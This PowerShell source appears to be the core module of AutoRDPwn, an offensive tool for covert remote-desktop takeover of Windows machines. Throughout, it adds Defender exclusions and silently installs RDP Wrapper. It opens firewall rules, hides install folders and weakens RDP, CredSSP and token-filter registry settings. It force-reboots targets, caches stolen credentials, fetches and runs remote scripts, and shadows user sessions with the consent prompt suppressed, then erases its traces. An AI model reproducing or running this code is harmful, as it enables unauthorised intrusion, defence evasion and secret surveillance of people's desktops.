$script:ARSession = $null
$script:AROverrideCredential = $null
$script:ARDefenderAvailable = $false
$script:ARDefenderAddedPaths = New-Object System.Collections.Generic.List[string]
$script:ARWorkDirs = New-Object System.Collections.Generic.List[string]
$script:ARTemporaryFiles = New-Object System.Collections.Generic.List[string]
$script:ARRemoteTempDirs = New-Object System.Collections.Generic.List[string]
$script:ARHashUserName = ''
$script:ARCmdKeyTargets = New-Object System.Collections.Generic.List[string]
$script:ARCleanupDone = $false

function Invoke-ARDownload {
    param(
        [Parameter(Mandatory = $true)][string]$Url,
        [Parameter(Mandatory = $true)][string]$OutFile
    )
    $oldProgress = $ProgressPreference
    $ProgressPreference = 'SilentlyContinue'
    try {
        Invoke-WebRequest -Uri $Url -OutFile $OutFile -UseBasicParsing -ErrorAction Stop
    }
    catch {
        try { (New-Object Net.WebClient).DownloadFile($Url, $OutFile) }
        catch { throw "Download failed: $Url" }
    }
    finally { $ProgressPreference = $oldProgress }
    if (-not (Test-Path -LiteralPath $OutFile)) { throw "Download failed: $Url" }
}

function Get-ARResourcePath {
    param([Parameter(Mandatory = $true)][string]$RelativePath)
    $normalized = $RelativePath -replace '/', '\'
    $localPath = Join-Path $script:ARRoot $normalized
    if ($script:ARLocal -and (Test-Path -LiteralPath $localPath)) { return $localPath }
    if (Test-Path -LiteralPath $localPath) { return $localPath }
    $parent = Split-Path -Parent $localPath
    if (-not (Test-Path -LiteralPath $parent)) { New-Item -ItemType Directory -Path $parent -Force | Out-Null }
    $url = $script:ARRepository + '/' + ($normalized -replace '\\', '/')
    Invoke-ARDownload -Url $url -OutFile $localPath
    return $localPath
}

function Import-ARFunctionScript {
    param([Parameter(Mandatory = $true)][string]$RelativePath)
    $path = Get-ARResourcePath $RelativePath
    Import-Module -Name $path -Force -DisableNameChecking -ErrorAction Stop
}

function Import-ARToolScript {
    param([Parameter(Mandatory = $true)][string]$RelativePath)
    $path = Get-ARResourcePath $RelativePath
    $before = @(Get-ChildItem -LiteralPath $script:ARTools -File -ErrorAction SilentlyContinue | ForEach-Object { $_.FullName })
    Push-Location $script:ARTools
    try { . $path }
    finally { Pop-Location }
    $after = @(Get-ChildItem -LiteralPath $script:ARTools -File -ErrorAction SilentlyContinue | ForEach-Object { $_.FullName })
    foreach ($file in $after) {
        if ($before -notcontains $file) { $script:ARTemporaryFiles.Add($file) }
    }
}

function Resolve-ARLanguageName {
    param([string]$Name = '')
    $map = @{
        '1' = 'English'; '2' = 'Spanish'; '3' = 'French'; '4' = 'German'
        '5' = 'Italian'; '6' = 'Russian'; '7' = 'Portuguese'
        'en' = 'English'; 'es' = 'Spanish'; 'fr' = 'French'; 'de' = 'German'
        'it' = 'Italian'; 'ru' = 'Russian'; 'pt' = 'Portuguese'
        'english' = 'English'; 'spanish' = 'Spanish'; 'french' = 'French'; 'german' = 'German'
        'italian' = 'Italian'; 'russian' = 'Russian'; 'portuguese' = 'Portuguese'
    }
    if ([string]::IsNullOrWhiteSpace($Name)) {
        $culture = ''
        try { $culture = (Get-Culture).TwoLetterISOLanguageName.ToLowerInvariant() } catch { }
        if ($map.ContainsKey($culture)) { return $map[$culture] }
        return 'English'
    }
    $key = $Name.Trim().ToLowerInvariant()
    if ($map.ContainsKey($key)) { return $map[$key] }
    if ($key.Length -ge 2 -and $map.ContainsKey($key.Substring(0, 2))) { return $map[$key.Substring(0, 2)] }
    return 'English'
}

function Initialize-ARLanguage {
    param([string]$Name = '')
    $resolved = Resolve-ARLanguageName $Name
    $englishPath = Get-ARResourcePath 'Resources\Languages\English.ps1'
    Import-ARLanguage -Path $englishPath -AsFallback
    Import-ARLanguage -Path $englishPath
    if ($resolved -ne 'English') {
        try {
            $languagePath = Get-ARResourcePath ('Resources\Languages\' + $resolved + '.ps1')
            Import-ARLanguage -Path $languagePath
        }
        catch {
            $resolved = 'English'
        }
    }
    Set-ARLanguageName $resolved
}

function Initialize-ARDefender {
    $script:ARDefenderAddedPaths.Clear()
    try {
        $preference = Get-MpPreference -ErrorAction Stop
    }
    catch { return }
    $script:ARDefenderAvailable = $true
    $existingPaths = @($preference.ExclusionPath | Where-Object { $_ })
    $paths = @($script:ARRoot, $script:ARTools, (Join-Path $env:TEMP 'AutoRDPwn'))
    foreach ($path in $paths) {
        if ([string]::IsNullOrWhiteSpace($path)) { continue }
        if (-not (Test-Path -LiteralPath $path)) { continue }
        if ($existingPaths -contains $path) { continue }
        try {
            Add-MpPreference -ExclusionPath $path -ErrorAction Stop
            $script:ARDefenderAddedPaths.Add($path)
        } catch { }
    }
}

function Restore-ARDefender {
    if (-not $script:ARDefenderAvailable) { return }
    foreach ($path in $script:ARDefenderAddedPaths.ToArray()) {
        try { Remove-MpPreference -ExclusionPath $path -ErrorAction Stop } catch { }
    }
    $script:ARDefenderAddedPaths.Clear()
}

function Write-ARInfo { param([string]$Text); Write-Host ('[i] ' + $Text) -ForegroundColor Green }
function Write-ARSuccess { param([string]$Text); Write-Host ('[+] ' + $Text) -ForegroundColor Blue }
function Write-ARWarn { param([string]$Text); Write-Host ('[!] ' + $Text) -ForegroundColor Yellow }
function Write-ARError { param([string]$Text); Write-Host ('[!] ' + $Text) -ForegroundColor Red }
function Write-ARBlank { Write-Host '' }

function Read-ARValue {
    param([string]$Prompt, [string]$Default = '')
    while ($true) {
        $suffix = ': '
        if ($Default -ne '') { $suffix = ' [' + $Default + ']: ' }
        $value = Read-ARLineValue (' ' + $Prompt + $suffix)
        if ($null -eq $value) { $value = '' }
        $value = $value.Trim()
        if ($value -eq '' -and $Default -ne '') { return $Default }
        if ($value -ne '') { return $value }
        Write-ARWarn (Get-ARText 'txt6' 'Incorrect option, try again')
    }
}

function Read-ARSecret {
    param([string]$Prompt = 'Password')
    while ($true) {
        $value = Read-ARSecretValue (' ' + $Prompt + ': ')
        if ($null -ne $value -and $value -ne '') { return $value }
        Write-ARWarn (Get-ARText 'txt6' 'Incorrect option, try again')
    }
}

function Show-ARText {
    param($Value)
    if ($null -eq $Value) { return }
    $text = ($Value | Out-String).TrimEnd()
    if ($text -eq '') { return }
    Write-Host $text
    if ($text.Length -lt 1048576) {
        try { Set-Clipboard -Value $text } catch { }
    }
}

function Test-ARIsLocalTarget {
    $computer = [string]$script:ARTarget['Computer']
    if ([string]::IsNullOrWhiteSpace($computer)) { return $true }
    $names = @('localhost', '127.0.0.1', '::1', '.', $env:COMPUTERNAME)
    try { $names += [System.Net.Dns]::GetHostName() } catch { }
    return ($names -contains $computer)
}

function Get-ARTargetComputer {
    $computer = [string]$script:ARTarget['Computer']
    if ([string]::IsNullOrWhiteSpace($computer)) { return 'localhost' }
    return $computer
}

function Get-ARTargetUserName {
    $user = [string]$script:ARTarget['User']
    $domain = [string]$script:ARTarget['Domain']
    if ($domain -ne '' -and $user -ne '' -and $user -notmatch '\\') { return $domain + '\' + $user }
    return $user
}

function Get-ARPlainPassword {
    $password = [string]$script:ARTarget['Password']
    if ($password -eq '') {
        $password = Read-ARSecret 'Password'
        $script:ARTarget['Password'] = $password
    }
    return $password
}

function Get-ARTargetCredential {
    $user = [string]$script:ARTarget['User']
    if ([string]::IsNullOrWhiteSpace($user)) { return $null }
    $domain = [string]$script:ARTarget['Domain']
    if ($domain -ne '' -and $user -notmatch '\\') { $user = $domain + '\' + $user }
    $password = Get-ARPlainPassword
    $secure = ConvertTo-SecureString -String $password -AsPlainText -Force
    return New-Object System.Management.Automation.PSCredential($user, $secure)
}

function Connect-ARTargetSession {
    param(
        [System.Management.Automation.PSCredential]$Credential = $null,
        [switch]$Force
    )
    $target = Get-ARTargetComputer
    if (-not $Force -and $script:ARSession) {
        $state = ''
        try { $state = [string]$script:ARSession.State } catch { }
        if ($state -eq 'Opened') {
            if ([string]$script:ARSession.ComputerName -eq $target) {
                Set-ARSessionState ('connected (' + $target + ')')
                return $script:ARSession
            }
            Close-ARTargetSession
        }
    }
    if ($null -eq $Credential -and $script:AROverrideCredential) { $Credential = $script:AROverrideCredential }
    if ($null -eq $Credential) { $Credential = Get-ARTargetCredential }
    $parameters = @{ ComputerName = $target; ErrorAction = 'Stop' }
    if ($Credential) { $parameters['Credential'] = $Credential }
    $session = New-PSSession @parameters
    $script:ARSession = $session
    Set-ARSessionState ('connected (' + $target + ')')
    return $session
}

function Close-ARTargetSession {
    if ($script:ARSession) {
        try { Remove-PSSession -Session $script:ARSession -ErrorAction SilentlyContinue } catch { }
        $script:ARSession = $null
    }
    Set-ARSessionState ''
}

function Get-ARTargetSession {
    $session = Connect-ARTargetSession
    if (-not $session) { throw 'Unable to open a PowerShell session to the target.' }
    return $session
}

function Invoke-ARTargetCommand {
    param(
        [Parameter(Mandatory = $true)][scriptblock]$ScriptBlock,
        [object[]]$ArgumentList = @()
    )
    if (Test-ARIsLocalTarget) { return (& $ScriptBlock @ArgumentList) }
    $session = Get-ARTargetSession
    return Invoke-Command -Session $session -ScriptBlock $ScriptBlock -ArgumentList $ArgumentList -ErrorAction Stop
}

function New-ARWorkDirectory {
    $directory = Join-Path $script:ARTools ('work_' + [guid]::NewGuid().ToString('N'))
    New-Item -ItemType Directory -Path $directory -Force | Out-Null
    $script:ARWorkDirs.Add($directory)
    return $directory
}

function Copy-ARFileToTarget {
    param(
        [Parameter(Mandatory = $true)][string]$LocalPath,
        [Parameter(Mandatory = $true)][string]$RemotePath
    )
    if (-not (Test-Path -LiteralPath $LocalPath)) { throw "File not found: $LocalPath" }
    if (Test-ARIsLocalTarget) {
        $directory = New-ARWorkDirectory
        $destination = Join-Path $directory (Split-Path -Leaf $LocalPath)
        Copy-Item -LiteralPath $LocalPath -Destination $destination -Force
        return $destination
    }
    $session = Get-ARTargetSession
    $remoteDirectory = Split-Path -Parent $RemotePath
    Invoke-Command -Session $session -ArgumentList $remoteDirectory -ScriptBlock {
        param($path)
        if (-not (Test-Path -LiteralPath $path)) { New-Item -ItemType Directory -Path $path -Force | Out-Null }
    } -ErrorAction Stop
    try {
        Copy-Item -LiteralPath $LocalPath -Destination $RemotePath -ToSession $session -Force -ErrorAction Stop
    }
    catch {
        $bytes = [System.IO.File]::ReadAllBytes($LocalPath)
        $chunkSize = 48000
        $first = $true
        for ($offset = 0; $offset -lt $bytes.Length; $offset += $chunkSize) {
            $length = [Math]::Min($chunkSize, $bytes.Length - $offset)
            $base64 = [Convert]::ToBase64String($bytes, $offset, $length)
            Invoke-Command -Session $session -ArgumentList $RemotePath, $base64, $first -ScriptBlock {
                param($path, $data, $create)
                $chunk = [Convert]::FromBase64String($data)
                if ($create) {
                    [System.IO.File]::WriteAllBytes($path, $chunk)
                }
                else {
                    $stream = [System.IO.File]::Open($path, [System.IO.FileMode]::Append, [System.IO.FileAccess]::Write)
                    try { $stream.Write($chunk, 0, $chunk.Length) } finally { $stream.Dispose() }
                }
            } -ErrorAction Stop
            $first = $false
        }
    }
    return $RemotePath
}

function Invoke-ARTargetPowerShell {
    param(
        [Parameter(Mandatory = $true)][string]$RelativePath,
        [string]$Function = '',
        [hashtable]$Arguments = @{},
        [string]$Command = ''
    )
    $localPath = Get-ARResourcePath $RelativePath
    if (Test-ARIsLocalTarget) {
        $directory = New-ARWorkDirectory
        $scriptPath = Join-Path $directory (Split-Path -Leaf $localPath)
        Copy-Item -LiteralPath $localPath -Destination $scriptPath -Force
        Push-Location $directory
        try {
            return (& {
                param($path, $functionName, $argumentMap, $commandText)
                . $path
                if ($commandText -ne '') { Invoke-Expression $commandText }
                elseif ($functionName -ne '') {
                    $splat = @{}
                    if ($argumentMap) { foreach ($key in $argumentMap.Keys) { $splat[$key] = $argumentMap[$key] } }
                    & $functionName @splat
                }
            } $scriptPath $Function $Arguments $Command)
        }
        finally {
            Pop-Location
            Remove-Item -LiteralPath $directory -Recurse -Force -ErrorAction SilentlyContinue
        }
    }
    $session = Get-ARTargetSession
    $remoteDirectory = 'C:\Windows\Temp\AutoRDPwn_' + [guid]::NewGuid().ToString('N')
    $scriptPath = Join-Path $remoteDirectory (Split-Path -Leaf $localPath)
    Copy-ARFileToTarget -LocalPath $localPath -RemotePath $scriptPath | Out-Null
    try {
        return Invoke-Command -Session $session -ArgumentList $scriptPath, $Function, $Arguments, $Command -ScriptBlock {
            param($path, $functionName, $argumentMap, $commandText)
            Push-Location (Split-Path -Parent $path)
            try {
                . $path
                if ($commandText -ne '') { Invoke-Expression $commandText }
                elseif ($functionName -ne '') {
                    $splat = @{}
                    if ($argumentMap) { foreach ($key in $argumentMap.Keys) { $splat[$key] = $argumentMap[$key] } }
                    & $functionName @splat
                }
            }
            finally { Pop-Location }
        } -ErrorAction Stop
    }
    finally {
        try { Invoke-Command -Session $session -ArgumentList $remoteDirectory -ScriptBlock { param($path) Remove-Item -LiteralPath $path -Recurse -Force -ErrorAction SilentlyContinue } -ErrorAction SilentlyContinue } catch { }
    }
}

function Invoke-ARTargetBinary {
    param(
        [Parameter(Mandatory = $true)][string]$LocalPath,
        [string[]]$Arguments = @(),
        [string]$RemoteName = ''
    )
    if ([string]::IsNullOrWhiteSpace($RemoteName)) { $RemoteName = Split-Path -Leaf $LocalPath }
    if (Test-ARIsLocalTarget) {
        return (& $LocalPath @Arguments 2>&1)
    }
    $session = Get-ARTargetSession
    $remoteDirectory = 'C:\Windows\Temp\AutoRDPwn_' + [guid]::NewGuid().ToString('N')
    $remotePath = Join-Path $remoteDirectory $RemoteName
    Copy-ARFileToTarget -LocalPath $LocalPath -RemotePath $remotePath | Out-Null
    try {
        return Invoke-Command -Session $session -ArgumentList $remotePath, $Arguments -ScriptBlock {
            param($path, $binaryArguments)
            & $path @binaryArguments 2>&1
        } -ErrorAction Stop
    }
    finally {
        try { Invoke-Command -Session $session -ArgumentList $remoteDirectory -ScriptBlock { param($path) Remove-Item -LiteralPath $path -Recurse -Force -ErrorAction SilentlyContinue } -ErrorAction SilentlyContinue } catch { }
    }
}

function Get-ARPayloads {
    param([switch]$IncludeCreateUser)
    $payloads = New-Object System.Collections.Generic.List[string]
    foreach ($name in @('Pwn1', 'Pwn2', 'Pwn3', 'Pwn4')) {
        $value = Get-ARText $name ''
        if (-not [string]::IsNullOrWhiteSpace($value)) { $payloads.Add($value) }
    }
    if ($IncludeCreateUser -or $script:ARCreateUser) {
        $value = Get-ARText 'Pwn5' ''
        if (-not [string]::IsNullOrWhiteSpace($value)) { $payloads.Add($value) }
    }
    return $payloads.ToArray()
}

function Get-ARSessionId {
    param($Lines, [int]$Fallback = 1)
    $ids = New-Object System.Collections.Generic.List[int]
    foreach ($line in @($Lines)) {
        $text = [string]$line
        if ($text -match '^\s*>?\s*.*?\s+(\d+)\s+(?:Active|Disc|Conn|Listen|Inact|Start|Down)\b') {
            $id = [int]$Matches[1]
            if ($id -gt 0 -and -not $ids.Contains($id)) { $ids.Add($id) }
        }
    }
    if ($ids.Count -gt 0) { return ($ids | Sort-Object | Select-Object -First 1) }
    return $Fallback
}

function Install-ARRdpWrap {
    param([Parameter(Mandatory = $true)]$Session)
    $scriptPath = Get-ARResourcePath 'Resources\Scripts\Invoke-RDPwrap.ps1'
    Push-Location $script:ARTools
    try {
        . $scriptPath
        if (-not $RDPWrap) { throw 'RDPWrap payload is empty.' }
        $directory = New-ARWorkDirectory
        $msiPath = Join-Path $directory 'Setup.msi'
        [System.IO.File]::WriteAllBytes($msiPath, $RDPWrap)
        $remoteDirectory = 'C:\Windows\Temp\AutoRDPwn_' + [guid]::NewGuid().ToString('N')
        $remoteMsi = Join-Path $remoteDirectory 'Setup.msi'
        $remoteMsi = Copy-ARFileToTarget -LocalPath $msiPath -RemotePath $remoteMsi
        $ruleName = Get-ARText 'Pwn6' 'RDP session agent'
        Invoke-Command -Session $Session -ArgumentList $remoteMsi, $ruleName -ScriptBlock {
            param($msi, $rule)
            Start-Process -FilePath 'msiexec.exe' -ArgumentList @('/i', $msi, '/quiet', '/qn', '/norestart') -Wait
            netsh advfirewall firewall delete rule name="$rule" 2>&1> $null
            netsh advfirewall firewall add rule name="$rule" dir=in protocol=udp action=allow program="C:\Windows\System32\rdpsa.exe" enable=yes 2>&1> $null
            netsh advfirewall firewall add rule name="$rule" dir=in protocol=tcp action=allow program="C:\Windows\System32\rdpsa.exe" enable=yes 2>&1> $null
            attrib +h 'C:\Program Files\RDP Wrapper' 2>&1> $null
            attrib +h 'C:\Program Files (x86)\RDP Wrapper' 2>&1> $null
            if (Get-Process msiexec -ErrorAction SilentlyContinue) { Wait-Process -Name msiexec -Timeout 60 -ErrorAction SilentlyContinue }
            Remove-Item -LiteralPath (Split-Path -Parent $msi) -Recurse -Force -ErrorAction SilentlyContinue
        } -ErrorAction Stop
    }
    finally {
        Pop-Location
    }
}

function Invoke-ARShadowEngine {
    $target = Get-ARTargetComputer
    $credential = $script:AROverrideCredential
    if (-not $credential) { $credential = Get-ARTargetCredential }
    $session = Get-ARTargetSession
    $control = $true
    if ($script:ARShadowPreference -in @('see', 'view', 'ver', 'regarder', 'siehe', 'vedere')) { $control = $false }
    elseif ($script:ARShadowPreference -in @('control', 'controlar', 'controle', 'kontrolle', 'controllo')) { $control = $true }
    elseif ([string]$script:ARTarget['Mode'] -eq 'view') { $control = $false }

    Write-ARInfo (Get-ARText 'txt32' 'Changes in the Windows registry made successfully!')
    $previous = Invoke-Command -Session $session -ErrorAction Stop -ScriptBlock {
        $terminalServer = 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server'
        $winstation = 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp'
        function Get-ARRemoteValue($path, $name) {
            try {
                $item = Get-ItemProperty -Path $path -Name $name -ErrorAction Stop
                return $item.$name
            }
            catch { return $null }
        }
        $allowRemoteRpc = Get-ARRemoteValue $terminalServer 'AllowRemoteRPC'
        New-ItemProperty -Path $terminalServer -Name 'AllowRemoteRPC' -Value 1 -PropertyType DWORD -Force | Out-Null
        New-ItemProperty -Path $terminalServer -Name 'fDenyTSConnections' -Value 0 -PropertyType DWORD -Force | Out-Null
        New-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\WBEM\CIMOM' -Name 'AllowAnonymousCallback' -Value 1 -PropertyType DWORD -Force | Out-Null
        New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa' -Name 'DisableRestrictedAdmin' -Value 0 -PropertyType DWORD -Force | Out-Null
        New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters' -Name 'AutoShareWks' -Value 1 -PropertyType DWORD -Force | Out-Null
        New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters' -Name 'AutoShareServer' -Value 1 -PropertyType DWORD -Force | Out-Null
        New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Remote Assistance' -Name 'fAllowToGetHelp' -Value 1 -PropertyType DWORD -Force | Out-Null
        New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Remote Assistance' -Name 'fAllowFullControl' -Value 1 -PropertyType DWORD -Force | Out-Null
        New-ItemProperty -Path $winstation -Name 'SecurityLayer' -Value 0 -PropertyType DWORD -Force | Out-Null
        New-ItemProperty -Path $winstation -Name 'UserAuthentication' -Value 0 -PropertyType DWORD -Force | Out-Null
        New-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'LocalAccountTokenFilterPolicy' -Value 1 -PropertyType DWORD -Force | Out-Null
        New-Item -Path 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System\CredSSP\Parameters' -Force | Out-Null
        New-ItemProperty -Path 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System\CredSSP\Parameters' -Name 'AllowEncryptionOracle' -Value 2 -PropertyType DWORD -Force | Out-Null
        Enable-NetFirewallRule -Name 'RemoteDesktop-Shadow-In-TCP' -ErrorAction SilentlyContinue
        if (-not (Get-NetFirewallRule -Name 'AutoRDPwn-TermService-RPC-In' -ErrorAction SilentlyContinue)) {
            New-NetFirewallRule -Name 'AutoRDPwn-TermService-RPC-In' -DisplayName 'AutoRDPwn TermService RPC' -Direction Inbound -Action Allow -Program 'C:\Windows\System32\svchost.exe' -Service TermService -Protocol TCP -Profile Any -ErrorAction SilentlyContinue | Out-Null
        }
        $caption = (Get-CimInstance -ClassName Win32_OperatingSystem -ErrorAction SilentlyContinue).Caption
        $isServer = $caption -like '*Server*'
        $sessionId = $null
        if (-not $isServer) {
            try { $sessionId = (Get-Process explorer -ErrorAction SilentlyContinue | Sort-Object SessionId | Select-Object -Last 1).SessionId } catch { }
            if (-not $sessionId) { $sessionId = 1 }
        }
        [pscustomobject]@{
            AllowRemoteRpc = $allowRemoteRpc
            IsServer = $isServer
            HostName = $env:COMPUTERNAME
            SessionId = $sessionId
            Caption = $caption
        }
    }

        $plain = ''
        if ($credential) { $plain = $credential.GetNetworkCredential().Password }
        if ($credential -and $plain -ne '') {
            cmdkey.exe "/add:$target" "/user:$($credential.UserName)" "/pass:$plain" 2>&1> $null
            if (-not $script:ARCmdKeyTargets.Contains($target)) { $script:ARCmdKeyTargets.Add($target) }
        }
        Write-ARInfo ((([string](Get-ARText 'txt33' 'Detecting operating system version on')).TrimEnd()) + ' ' + ([string]$previous.HostName).ToLowerInvariant())
        if ($null -eq $previous.AllowRemoteRpc -or [int]$previous.AllowRemoteRpc -eq 0) {
            Write-ARWarn (Get-ARText 'txt86' 'The remote machine needs a reboot to apply the changes, rebooting..')
            try { Invoke-Command -Session $session -ScriptBlock { Restart-Computer -Force } -ErrorAction SilentlyContinue } catch { }
            try { Remove-PSSession -Session $session -ErrorAction SilentlyContinue } catch { }
            $script:ARSession = $null
            Start-Sleep -Seconds 60
            $session = $null
            for ($attempt = 0; $attempt -lt 30; $attempt++) {
                Start-Sleep -Seconds 3
                try {
                    $session = Connect-ARTargetSession -Credential $credential -Force
                    if ($session) { break }
                } catch { }
            }
            if (-not $session) { throw 'The target did not come back after the reboot.' }
        }

        if ($previous.IsServer) {
            try {
                Invoke-Command -Session $session -ScriptBlock {
                    (Get-CimInstance -ClassName Win32_TSGeneralSetting -Namespace root\cimv2\terminalservices -Filter "TerminalName='RDP-tcp'").SetUserAuthenticationRequired(0) | Out-Null
                } -ErrorAction SilentlyContinue | Out-Null
            } catch { }
            $query = Invoke-Command -Session $session -ScriptBlock { query session 2>&1 } -ErrorAction SilentlyContinue
            Show-ARText $query
            $sessionId = Get-ARSessionId $query 1
            if (-not $script:ARInvokedFromOption) {
                $answer = Read-ARValue (Get-ARText 'txt36' 'What session do you want to connect to?') ([string]$sessionId)
                if ($answer -match '^\d+$') { $sessionId = [int]$answer }
            }
        }
        else {
            $sessionId = [int]$previous.SessionId
            if (-not $sessionId) { $sessionId = 1 }
            try { Install-ARRdpWrap -Session $session }
            catch { Write-ARWarn ('RDPWrap could not be installed: ' + $_.Exception.Message) }
        }

        $arguments = @("/v:$target", '/admin')
        if ($sessionId) {
            $arguments += "/shadow:$sessionId"
            $arguments += '/noconsentprompt'
            if ($control) { $arguments += '/control' }
        }
        $arguments += '/f'
        if ($script:ARNoGui) {
            Write-Host ('mstsc ' + ($arguments -join ' ')) -ForegroundColor DarkGray
        }
        else {
            Write-ARInfo (Get-ARText 'txt38' 'Starting remote connection!')
            Start-Process -FilePath 'mstsc.exe' -ArgumentList $arguments | Out-Null
        }
        return [pscustomobject]@{ Control = $control; SessionId = $sessionId; FullDesktop = (-not $sessionId) }
}


function Invoke-ARAction {
    param([Parameter(Mandatory = $true)][string]$Id)
    $action = Get-ARActionById $Id
    if (-not $action) {
        Write-ARError 'Unknown action.'
        return
    }
    Clear-ARScreen
    Set-ARStatus ($action.Title) 'Info'
    try {
        & $action.Handler
        if ($script:ARStatus['Kind'] -eq 'Info') { Set-ARStatus ($action.Title + ' finished') 'Ok' }
    }
    catch {
        Set-ARStatus $_.Exception.Message 'Error'
        Write-ARError $_.Exception.Message
    }
    if (-not $script:ARInvokedFromOption) {
        Write-ARBlank
        Write-Host ' Press any key to return to the menu' -ForegroundColor DarkGray
        try { $null = [Console]::ReadKey($true) } catch { try { Read-Host | Out-Null } catch { } }
    }
}

function Invoke-ARCleanup {
    if ($script:ARCleanupDone) { return }
    $script:ARCleanupDone = $true
    if ($script:ARNoClean) {
        Close-ARTargetSession
        Restore-ARDefender
        $script:AROverrideCredential = $null
        return
    }
    if ($script:ARSession) {
        try {
            Invoke-Command -Session $script:ARSession -ScriptBlock {
                Get-Job -ErrorAction SilentlyContinue | Where-Object { $_.Name -like 'AutoRDPwn_*' } | Stop-Job -ErrorAction SilentlyContinue
                Get-Job -ErrorAction SilentlyContinue | Where-Object { $_.Name -like 'AutoRDPwn_*' } | Remove-Job -Force -ErrorAction SilentlyContinue
            } -ErrorAction SilentlyContinue | Out-Null
        } catch { }
        foreach ($directory in $script:ARRemoteTempDirs.ToArray()) {
            try {
                Invoke-Command -Session $script:ARSession -ArgumentList $directory -ScriptBlock {
                    param($path)
                    Remove-Item -LiteralPath $path -Recurse -Force -ErrorAction SilentlyContinue
                } -ErrorAction SilentlyContinue | Out-Null
            } catch { }
        }
    }
    if ($script:ARHashUserName -ne '' -and $script:ARSession) {
        try {
            Invoke-Command -Session $script:ARSession -ArgumentList $script:ARHashUserName -ScriptBlock {
                param($name)
                net user $name /delete 2>&1> $null
                Remove-Item -LiteralPath (Join-Path 'C:\Users' $name) -Recurse -Force -ErrorAction SilentlyContinue
                Unregister-ScheduledTask -TaskName 'AutoRDPwn' -Confirm:$false -ErrorAction SilentlyContinue
            } -ErrorAction SilentlyContinue | Out-Null
        } catch { }
    }
    $script:ARHashUserName = ''
    foreach ($target in $script:ARCmdKeyTargets.ToArray()) {
        cmdkey.exe "/delete:$target" 2>&1> $null
    }
    $script:ARCmdKeyTargets.Clear()
    Close-ARTargetSession
    Restore-ARDefender
    foreach ($directory in $script:ARWorkDirs.ToArray()) {
        if (Test-Path -LiteralPath $directory) {
            Remove-Item -LiteralPath $directory -Recurse -Force -ErrorAction SilentlyContinue
        }
    }
    foreach ($file in $script:ARTemporaryFiles.ToArray()) {
        if (Test-Path -LiteralPath $file) {
            Remove-Item -LiteralPath $file -Force -ErrorAction SilentlyContinue
        }
    }
    $script:ARWorkDirs.Clear()
    $script:ARTemporaryFiles.Clear()
    $script:ARRemoteTempDirs.Clear()
    $script:AROverrideCredential = $null
    try { Set-Location -LiteralPath $script:AROriginalLocation } catch { }
    Write-ARInfo (Get-ARText 'txt76' 'Cleaning done!')
}
